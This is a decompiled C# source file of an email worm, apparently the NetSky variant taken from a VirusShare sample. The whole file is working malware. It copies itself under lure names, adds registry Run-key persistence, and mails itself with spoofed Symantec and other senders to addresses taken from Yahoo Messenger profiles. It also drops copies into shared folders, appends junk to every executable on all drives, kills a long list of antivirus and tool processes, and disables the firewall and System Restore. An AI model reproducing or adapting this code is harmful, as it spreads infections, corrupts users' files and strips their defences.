// Decompiled with JetBrains decompiler
// Type: Amir.sm
// Assembly: WindowsApplication1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DC40BFE-5561-4B35-9F21-C87AC157914A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Email-Worm.Win32.NetSky.gqs-64b7856246d98ae3f973878e308f10c52ae94fa7c389ab9ec6ab9dc3032c924b.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web.Mail;
using System.Windows.Forms;

namespace Amir
{
  internal class sm
  {
    private static void Main(string[] args)
    {
      sm sm = new sm();
      sm.mutex();
      sm.Junck();
      sm.skynet();
      sm.Junck();
      sm.ccopy();
      sm.Junck();
      try
      {
        File.Copy(Application.ExecutablePath, "C:\\Amir30vil.pif");
        File.Copy(Application.ExecutablePath, "C:\\install.exe");
        File.Copy(Application.ExecutablePath, "C:\\tutorial.pdf.pif");
        File.Copy(Application.ExecutablePath, "C:\\messenger2007.exe");
        File.Copy(Application.ExecutablePath, "C:\\SEX.scr");
        File.Copy(Application.ExecutablePath, "C:\\shop.exe");
      }
      catch (Exception ex)
      {
      }
      sm.setreg();
      sm.regist2();
      sm.regist3();
      sm.setreg7();
      sm.setreg8();
      sm.setreg9();
      sm.killer();
      for (char ch = 'B'; ch <= 'Z'; ++ch)
      {
        string str = ch.ToString() + ":\\";
        if (Directory.Exists(str))
        {
          try
          {
            sm.DispEXE(str);
          }
          catch (Exception ex)
          {
          }
        }
      }
      for (char ch = 'B'; ch <= 'Z'; ++ch)
      {
        string str = ch.ToString() + ":\\";
        if (Directory.Exists(str))
        {
          try
          {
            sm.infect(str);
          }
          catch (Exception ex)
          {
          }
        }
      }
      while (true)
      {
        try
        {
          string td = Directory.GetDirectoryRoot(Directory.GetCurrentDirectory()) + "Program Files\\Yahoo!\\Messenger\\Profiles";
          sm.GetMail(td);
        }
        catch
        {
          sm.killer();
          Thread.Sleep(1200000);
        }
      }
    }

    public void GetMail(string td)
    {
      try
      {
        foreach (string directory in Directory.GetDirectories(td))
        {
          try
          {
            DirectoryInfo directoryInfo = new DirectoryInfo(directory);
            if (!(directoryInfo.Name == "Archive"))
            {
              if (!(directoryInfo.Name == "My Icons"))
              {
                if (!(directoryInfo.Name == "Messages"))
                  this.SendMail(directoryInfo.Name + "@yahoo.com");
              }
            }
          }
          catch
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(td))
        {
          try
          {
            this.GetMail(directory);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }

    public void SendMail(string to)
    {
      for (int index1 = 0; index1 <= 8; ++index1)
      {
        try
        {
          string[] strArray = new string[6]
          {
            "C:\\Amir30vil.pif",
            "C:\\install.exe",
            "C:\\tutorial.pdf.pif",
            "C:\\messenger2007.exe",
            "C:\\SEX.scr",
            "C:\\shop.exe"
          };
          int index2 = new Random().Next(0, 6);
          string filename = strArray[index2];
          string str1 = new string[6]
          {
            "Thank you for registered",
            "Norton 360",
            "Sex Toturial ",
            "Assistant 2007",
            "Sexy screen saver",
            "hug penis"
          }[index2];
          string str2 = new string[6]
          {
            "hi dear thank you for registration you must download and install this software",
            "response for request  i agree a bout it downoad free software www.symantec.com",
            "this is the best book of sex tutorial download and read it",
            "+++ Assistant 2007+++",
            "this is very hot sex ! sex! sex!  www.xnxx.com",
            "SEX! Sex!SEX! Sex!SEX! Sex!SEX! Sex!SEX! Sex!SEX! Sex!SEX! Sex!"
          }[index2];
          string str3 = new string[6]
          {
            "esafe.virus@ealaddin.com",
            "support@symantec.com",
            "xxx@penis.com",
            "Assistant@software.com",
            "support@xnxx.com",
            "SexTutorial@swp.com"
          }[index2];
          MailMessage message = new MailMessage();
          message.From = str3;
          message.To = to;
          message.Subject = str1;
          message.Body = str2;
          SmtpMail.SmtpServer = "mx1.mail.yahoo.com";
          message.Attachments.Add((object) new MailAttachment(filename, MailEncoding.Base64));
          SmtpMail.Send(message);
          Console.WriteLine("Send Mail");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Can Not Send Mail");
        }
      }
    }

    public void ccopy()
    {
      try
      {
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\LSSASS.exe");
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\LSSASS.exeopen");
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\LSSASS.exeopenopen");
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\LSSASS.exeopenopenopenopen");
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\WinKrn32.cab.exe");
        File.Copy(Application.ExecutablePath, Environment.SystemDirectory + "\\Update.exe");
        Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "MDM32.exe", (object) (Environment.SystemDirectory + "\\LSSASS.exe"), RegistryValueKind.String);
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WinKrnl32.cab.exe", (object) (Environment.SystemDirectory + "\\WinKrn32.cab.exe"), RegistryValueKind.String);
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Update.exe", (object) (Environment.SystemDirectory + "\\Update.exe"), RegistryValueKind.String);
      }
      catch (Exception ex)
      {
      }
    }

    public void DispEXE(string tD)
    {
      try
      {
        string[] directories = Directory.GetDirectories(tD);
        string[] strArray = new string[36]
        {
          "own",
          "it",
          "upl",
          "syst",
          "se",
          "usic",
          "efu",
          "am",
          "caf",
          "yma",
          "mp3",
          "wav",
          "ovi",
          "roj",
          "win",
          "ict",
          "my",
          "ina",
          "Shar",
          "aza",
          "onk",
          "mob",
          "tart",
          "ffic",
          "av",
          "rack",
          "ile",
          "W32",
          "root",
          "assw",
          "Sounds",
          "ideo",
          "rit",
          "ist",
          "ys",
          "orn"
        };
        foreach (string input in directories)
        {
          try
          {
            foreach (string pattern in strArray)
            {
              try
              {
                if (Regex.IsMatch(input, pattern))
                {
                  if (Regex.IsMatch(input, "mule"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\NewWeb.exe");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "kaza"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\Downloader.pif");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "upl"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\upload-file.exe");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "syst"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\system.dll.cmd");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "hare"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\SexyScreenSaver.scr");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "comi"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\MyMiusic.exe");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "efu"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\defult-path.cmd");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "ame"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\FunGame.flash.exe");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "cafe"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\Mcafee-AV.pif");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "ort"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\PortScanner.exe");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "yman"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\SymantecUpdate.exe");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "mp3"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\Mp3Player.pif");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                  if (Regex.IsMatch(input, "xxx"))
                  {
                    File.Copy(Application.ExecutablePath, input + "\\WaveToMp32.exe");
                    File.Copy(Application.ExecutablePath, input + "\\sex.pif");
                    File.Copy(Application.ExecutablePath, input + "\\xnxx.scr");
                    File.Copy(Application.ExecutablePath, input + "\\baglesourcecode.pif");
                    File.Copy(Application.ExecutablePath, input + "\\nortn360.exe");
                    File.Copy(Application.ExecutablePath, input + "\\New.exe");
                  }
                }
              }
              catch (Exception ex)
              {
              }
            }
          }
          catch (Exception ex)
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(tD))
          this.DispEXE(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public void infect(string tf)
    {
      try
      {
        foreach (string file in Directory.GetFiles(tf, "*.exe"))
        {
          try
          {
            BinaryWriter binaryWriter = new BinaryWriter((Stream) new FileStream(file, FileMode.Open, FileAccess.Write));
            binaryWriter.BaseStream.Seek(0L, SeekOrigin.End);
            for (int index = 0; index < 70; ++index)
              binaryWriter.Write("AmIrCiViL");
            binaryWriter.Close();
          }
          catch (Exception ex)
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(tf))
          this.infect(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public void killer()
    {
      try
      {
        string[] strArray = new string[424]
        {
          "ACKWIN32",
          "ADAWARE",
          "ADVXDWIN",
          "AGENTSVR",
          "AGENTW ",
          "ALERTSVC",
          "ALEVIR",
          "ALOGSERV",
          "AMON9X ",
          "ANTI-TROJAN",
          "ANTIVIRUS ",
          "ANTS ",
          "APIMONITOR",
          "APLICA32 ",
          "APVXDWIN ",
          "ARR ",
          "ATCON",
          "ATRO55EN",
          "ATUPDATER",
          "ATUPDATER ",
          "ATWATCH ",
          "AU ",
          "AUPDATE",
          "AUPDATE ",
          "AUTODOWN ",
          "AUTODOWN",
          "AUTOTRACE ",
          "AUTOTRACE ",
          "AUTOUPDATE ",
          "AUTOUPDATE ",
          "AVCONSOL ",
          "AVE32 ",
          "AVGCC32",
          "AVGCTRL",
          "AVGNT ",
          "AVGSERV",
          "AVGSERV9",
          "AVGW ",
          "AVKPOP",
          "AVKSERV",
          "AVKSERVICE",
          "AVKWCTl9 ",
          "AVLTMAIN ",
          "AVNT ",
          "AVP ",
          "AVP32",
          "AVPCC ",
          "AVPDOS32",
          "AVPM ",
          "AVPTC32",
          "AVPUPD ",
          "AVPUPD ",
          "AVSCHED32",
          "AVSYNMGR",
          "AVWINNT ",
          "AVWUPD ",
          "AVWUPD32",
          "AVWUPD32 ",
          "AVWUPSRV ",
          "AVXMONITOR9X",
          "AVXMONITORNT ",
          "AVXQUAR ",
          "AVXQUAR ",
          "BACKWEB ",
          "BARGAINS ",
          "BD_PROFESSIONAL",
          "BEAGLE",
          "BELT ",
          "BIDEF ",
          "BIDSERVER",
          "BIPCP",
          "BIPCPEVALSETUP ",
          "BISP",
          "BLACKD",
          "BLACKICE",
          "BLSS",
          "BOOTCONF",
          "BOOTWARN",
          "BORG2 ",
          "BPC ",
          "BRASIL",
          "BS120",
          "BUNDLE",
          "BVT ",
          "CCAPP",
          "CCEVTMGR",
          "CCPXYSVC ",
          "CDP ",
          "CFD",
          "CFGWIZ",
          "CFIADMIN",
          "CFIAUDIT",
          "CFINET",
          "CFINET32",
          "CLEAN",
          "CLEANER",
          "CLEANER3",
          "CLEANPC ",
          "CLICK ",
          "CMD32 ",
          "CMESYS ",
          "CMGRDIAN",
          "CMON016 ",
          "CONNECTIONMONITOR",
          "CPD ",
          "CPF9X206",
          "CPFNT206",
          "CTRL ",
          "CV ",
          "CWNB181",
          "CWNTDWMO ",
          "IEXPLORER",
          "IFACE ",
          "IFW2000",
          "INETLNFO",
          "INFUS ",
          "INFWIN",
          "INIT ",
          "INTDEL",
          "INTREN ",
          "IOMON98",
          "ISTSVC ",
          "JAMMER ",
          "JDBGMRG ",
          "JEDI ",
          "KAVLITE40ENG ",
          "KAVPERS40ENG ",
          "KAVPF ",
          "KAZZA",
          "KEENVALUE",
          "KERIO-PF-213-EN-WIN",
          "KERIO-WRL-421-EN-WIN",
          "KERIO-WRP-421-EN-WIN",
          "KERNEL32",
          "KILLPROCESSSETUP161",
          "LAUNCHER",
          "LDNETMON ",
          "LDPRO ",
          "LDPROMENU",
          "LDSCAN",
          "LNETINFO",
          "LOADER ",
          "LOCALNET",
          "LOCKDOWN",
          "LOCKDOWN2000",
          "LOOKOUT ",
          "LORDPE ",
          "LSETUP",
          "LUALL ",
          "LUAU ",
          "LUCOMSERVER ",
          "LUINIT ",
          "LUSPT",
          "MAPISVC32",
          "MCAGENT ",
          "MCMNHDLR ",
          "MCSHIELD ",
          "MCTOOL ",
          "MCUPDATE",
          "MCUPDATE ",
          "MCVSRTE",
          "MCVSSHLD ",
          "MD ",
          "MFIN32",
          "MFW2EN ",
          "MFWENG3.02D30 ",
          "MGAVRTCL ",
          "MGAVRTE ",
          "MGHTML",
          "MGUI ",
          "MINILOG",
          "MMOD",
          "MONITOR",
          "MOOLIVE",
          "MOSTAT ",
          "MPFAGENT ",
          "MPFSERVICE ",
          "MPFTRAY ",
          "MRFLUX",
          "MSAPP ",
          "MSBB ",
          "MSBLAST",
          "MSCACHE ",
          "MSCCN32 ",
          "MSCMAN ",
          "MSCONFIG",
          "MSDM ",
          "MSDOS",
          "MSIEXEC16",
          "MSINFO32",
          "MSLAUGH ",
          "MSMGT ",
          "MSMSGRI32",
          "MSSMMC32",
          "MSSYS ",
          "MSVXD",
          "MU0311AD",
          "MWATCH ",
          "N32SCANW",
          "NAV ",
          "AUTO-PROTECT.NAV80TRY",
          "NAVAP.NAVAPSVC",
          "NAVAPSVC ",
          "NAVAPW32",
          "NAVDX ",
          "NAVLU32",
          "NAVNT ",
          "NAVSTUB ",
          "NAVW32",
          "NAVWNT",
          "NC2000 ",
          "NCINST4",
          "NDD32 ",
          "NEOMONITOR ",
          "NEOWATCHLOG ",
          "NETARMOR ",
          "NETD32 ",
          "NETINFO",
          "NETMON",
          "NETSCANPRO",
          "NETSPYHUNTER-1.2",
          "NETSTAT ",
          "NETUTILS",
          "NISSERV ",
          "NISUM ",
          "NMAIN ",
          "NOD32 ",
          "NORMIST",
          "NORTON_INTERNET_SECU_3.0_407",
          "NOTSTART",
          "NPF40_TW_98_NT_ME_2K",
          "NPFMESSENGER ",
          "NPROTECT",
          "NPSCHECK",
          "NPSSVC ",
          "NSCHED32",
          "NSSYS32",
          "NSTASK32",
          "NSUPDATE",
          "NT",
          "NTRTSCAN",
          "NTVDM",
          "NTXconfig",
          "NUI",
          "NUPGRADE",
          "NUPGRADE",
          "NVARCH16",
          "NVC95",
          "NVSVC32",
          "NWINST4",
          "NWSERVICE",
          "NWTOOL16",
          "OLLYDBG",
          "ONSRVR",
          "OPTIMIZE",
          "OSTRONET",
          "OTFIX",
          "OUTPOST",
          "OUTPOST",
          "OUTPOSTINSTALL",
          "OUTPOSTPROINSTALL",
          "PADMIN",
          "PANIXK",
          "PATCH",
          "PAVCL",
          "PAVPROXY",
          "PAVSCHED",
          "PAVW",
          "PCFWALLICON",
          "PCIP10117_0",
          "PCSCAN",
          "PDSETUP",
          "PERISCOPE",
          "PERSFW",
          "PERSWF",
          "PF2",
          "PFWADMIN",
          "PGMONITR",
          "PINGSCAN",
          "PLATIN",
          "POP3TRAP",
          "POPROXY",
          "POPSCAN",
          "PORTDETECTIVE",
          "PORTMONITOR",
          "POWERSCAN",
          "PPINUPDT",
          "PPTBC",
          "PPVSTOP",
          "PRIZESURFER",
          "PRMT",
          "PRMVR",
          "PROCDUMP",
          "PROCESSMONITOR",
          "PROCEXPLORERV1.0",
          "PROGRAMAUDITOR",
          "PROPORT",
          "PROTECTX ",
          "PSPF",
          "PURGE",
          "QCONSOLE",
          "QSERVER",
          "RAPAPP",
          "RAV7",
          "RAV7WIN",
          "RAV8WIN32ENG",
          "RAY",
          "RB32",
          "RCSYNC",
          "REALMON",
          "REGED",
          "REGEDIT",
          "REGEDT32",
          "RESCUE",
          "RESCUE32",
          "RRGUARD",
          "RSHELL",
          "RTVSCAN",
          "RTVSCN95",
          "RULAUNCH",
          "RUN32DLL",
          "RUNDLL",
          "RUNDLL16",
          "RUXDLL32",
          "SAFEWEB",
          "SAHAGENT ",
          "SAVE",
          "SAVENOW",
          "SBSERV",
          "SC",
          "SCAM32",
          "SCAN32",
          "SCAN95",
          "SCANPM",
          "SCRSCAN",
          "SETUPVAMEEVAL",
          "SETUP_FLOWPROTECTOR_US",
          "SFC",
          "SGSSFW32",
          "SH",
          "SHELLSPYINSTALL",
          "SHN",
          "SHOWBEHIND",
          "SMC",
          "SMS",
          "SMSS32",
          "SOAP",
          "SOFI",
          "SPERM",
          "SPF",
          "SPHINX",
          "SPOLER",
          "SPOOLCV",
          "SPOOLSV32",
          "SPYXX",
          "SREXE",
          "SRNG",
          "SS3EDIT",
          "SSGRATE",
          "SSG_4104",
          "ST2",
          "START",
          "STCLOADER",
          "SUPFTRL",
          "SUPPORT",
          "SUPPORTER5",
          "SVC",
          "SVCHOSTC",
          "SVCHOSTS",
          "SVSHOST",
          "SWEEP95 ",
          "SWEEPNET.SWEEPSRV.SYS.SWNETSUP",
          "SYMPROXYSVC",
          "SYMTRAY",
          "SYSEDIT ",
          "SYSTEM",
          "SYSTEM32",
          "SYSUPD",
          "TASKMG",
          "TASKMO",
          "TASKMON",
          "TAUMON",
          "TBSCAN",
          "TC",
          "TCA",
          "TCM",
          "TDS-3",
          "TDS2-NT",
          "TEEKIDS",
          "TFAK",
          "TFAK5",
          "TGBOB",
          "TITANIN",
          "TITANINXP",
          "TRACERT",
          "TRICKLER",
          "TRJSCAN",
          "TRJSETUP",
          "TROJANTRAP3",
          "TSADBOT",
          "TVMD",
          "TVTMD",
          "UNDOBOOT",
          "UPDAT",
          "UPDATE",
          "UPDATE",
          "UPGRAD",
          "UTPOST",
          "VBCMSERV",
          "VBCONS",
          "VBUST ",
          "VBWIN9X",
          "VBWINNTW",
          "VCSETUP",
          "VET32 ",
          "VET95",
          "vb6",
          "taskmgr",
          "regedit",
          "notepad",
          "install",
          "setup",
          "MpfConsole",
          "AmIrCiViL"
        };
        foreach (string processName in strArray)
        {
          try
          {
            foreach (Process process in Process.GetProcessesByName(processName))
              process.CloseMainWindow();
          }
          catch (Exception ex)
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public void mutex()
    {
      try
      {
        new Mutex(false, "AmirCivil").WaitOne();
      }
      catch (Exception ex)
      {
      }
    }

    public void regist2()
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string[] strArray = new string[26]
      {
        "Taskmon",
        "Explorer",
        "Windows Services Host",
        "KasperskyAV",
        " d3dupdate.exe",
        "au.exe",
        "OLE",
        "winupd.exe",
        "direct.exe ",
        "jijbl ",
        "Video ",
        "service",
        "DELETE ME",
        "d3dupdate.exe",
        "Sentry",
        "gouday.exe",
        "rate.exe",
        "Windows Services Host",
        "sysmon.exe ",
        "srate.exe",
        "ssate.exe ",
        "Microsoft IE Execute shell",
        "Winsock2 driver",
        "ICM version",
        "yeahdude.exe ",
        "Microsoft System Checkup"
      };
      foreach (string name in strArray)
      {
        try
        {
          registryKey.DeleteValue(name);
        }
        catch (Exception ex)
        {
        }
      }
    }

    public void regist3()
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string[] strArray = new string[35]
      {
        "9XHtProtect",
        "Antivirus ",
        "EasyAV ",
        "FirewallSvr ",
        "HtProtect",
        "ICQ Net ",
        "Jammer2nd ",
        "KasperskyAVEng ",
        "My AV ",
        "Norton Antivirus AV ",
        "PandaAVEngine ",
        "Sentry",
        "Explorer",
        "system",
        "msgsvr32",
        "au.exe",
        "winupd.exe",
        "direct.exe ",
        "jijbl ",
        "Video ",
        "service",
        "SkynetsRevenge ",
        "d3dupdate.exe",
        "Sentry",
        "gouday.exe",
        "rate.exe",
        "Windows Services Host",
        "sysmon.exe ",
        "srate.exe",
        "ssate.exe ",
        "Microsoft IE Execute shell",
        "Winsock2 driver",
        "ICM version",
        "yeahdude.exe ",
        "Special Firewall Service "
      };
      foreach (string name in strArray)
      {
        try
        {
          registryKey.DeleteValue(name);
        }
        catch (Exception ex)
        {
        }
      }
    }

    public void setreg()
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess", "Start", (object) "4", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
    }

    public void setreg7()
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\\\ControlSet001\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile", "EnableFirewal", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
    }

    public void setreg8()
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\OLE", "EnableDCOM", (object) "N", RegistryValueKind.String);
      }
      catch (Exception ex)
      {
      }
    }

    public void setreg9()
    {
      try
      {
        Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRestore", "DisableSR", (object) "1", RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
    }

    public void Junck()
    {
    }

    public void skynet()
    {
      try
      {
        new Mutex(false, "AmirCivil").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "AdmMoodownJKIS003").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "(S)(k)(y)(N)(e)(t)").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "____--->>>>U<<<<--____").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "NetDy_Mutex_Psycho").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "_-=oOOSOkOyONOeOtOo=-_").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "SyncMutex_USUkUyUnUeUtUU").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "Protect_USUkUyUnUeUtU_Mutex").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "_-oOaxX|-+S+-+k+-+y+-+N+-+e+-+t+-|XxKOo-_").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "Bgl_*L*o*o*s*e*").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "NetDy_Mutex_Psycho").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "SkYnEt_AVP").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "KO[SkyNet.cz]SystemsMutex").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "MI[SkyNet.cz]SystemsMutex").WaitOne();
      }
      catch (Exception ex)
      {
      }
      try
      {
        new Mutex(false, "Netsky AV Guard").WaitOne();
      }
      catch (Exception ex1)
      {
        try
        {
          new Mutex(false, "LK[SkyNet.cz]SystemsMutex").WaitOne();
        }
        catch (Exception ex2)
        {
        }
        try
        {
          new Mutex(false, "S-k-y-n-e-t--A-n-t-i-v-i-r-u-s-T-e-a-m").WaitOne();
        }
        catch (Exception ex3)
        {
        }
        try
        {
          new Mutex(false, "Jobaka3").WaitOne();
        }
        catch (Exception ex4)
        {
        }
        try
        {
          new Mutex(false, "Jobaka3l").WaitOne();
        }
        catch (Exception ex5)
        {
        }
      }
    }
  }
}
